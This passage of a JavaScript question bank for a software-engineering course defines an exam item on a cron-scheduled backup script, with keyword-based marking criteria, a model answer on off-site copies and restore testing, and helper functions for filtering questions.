it. Defining these boundaries explicitly protects the project from scope creep and makes the feasibility assessment realistic for the time available.'
    }),
    Q({
      id: 'SEP-Q6', area: 'SEP', points: ['SEP-3.5', 'SEP-3.6'], outcome: 'SE-12-09', marks: 3, format: 'short',
      media: log(`$ crontab -l
0 2 * * *  /home/dev/backup.sh

$ cat backup.sh
#!/bin/bash
STAMP=$(date +%Y-%m-%d_%H%M)
tar -czf /backups/project_$STAMP.tar.gz /home/dev/project
find /backups -name "project_*.tar.gz" -mtime +30 -delete`),
      stem: 'Explain what this backup arrangement does and evaluate it. Identify one significant weakness and how you would address it.',
      criteria: [
        { t: 'Explains the schedule and the script — nightly timestamped compressed archive, 30-day retention', kw: ['daily', '2am', 'nightly', 'timestamp', 'compress', 'tar', '30 day', 'retention', 'delete'] },
        { t: 'Identifies a significant weakness (same machine, untested restore, no off-site copy, no encryption, no verification)', kw: ['same machine', 'off-site', 'offsite', 'restore', 'untested', 'encrypt', 'verif', 'single'] },
        { t: 'Gives a specific remediation', kw: ['copy', 'cloud', 'remote', 'test restore', '3-2-1', 'encrypt', 'monitor'] }
      ],
      sample: 'The crontab entry runs backup.sh at 02:00 every day. The script builds a timestamped filename, creates a gzip-compressed tar archive of the project directory in /backups, then deletes any archive older than 30 days, giving an automated rolling 30-day history without manual effort — this satisfies the requirement to demonstrate programmed data backup. The significant weakness is that /backups is on the same machine as /home/dev/project, so the event most likely to destroy the data — disk failure, theft, ransomware or accidental deletion of the whole machine — destroys every backup with it. The fix is to follow the 3-2-1 principle: after creating the archive, copy it off the machine (rsync to a remote server or upload to cloud object storage), keeping at least one copy off-site and ideally one immutable. Two secondary weaknesses are worth addressing at the same time: the script does not check whether tar succeeded, so a silent failure would go unnoticed until a restore is attempted, and a restore has evidently never been tested — an untested backup is only a hypothesis. Adding exit-status checking with an alert on failure, and a scheduled quarterly restore test, would make the arrangement dependable.'
    })
  ];

  /* ---- helpers ---------------------------------------------------------- */
  const byArea = id => QUESTIONS.filter(q => q.area === id);
  const byYear = y => QUESTIONS.filter(q => {
    const a = A.Syllabus.AREA_INDEX[q.area];
    return a && a.year === y;
  });
  const byId = id => QUESTIONS.find(q => q.id === id);
  const forPoint = pid => QUESTIONS.filter(q => q.points.indexOf(pid) !== -1);
  const totalMarks = list => list.reduce((s, q) => s + q.marks, 0);

  A.Questions = { QUESTIONS, byArea, byYear, byId, forPoint, totalMarks, code, log, dgm, scen };
})(window.APP = window.APP || {});
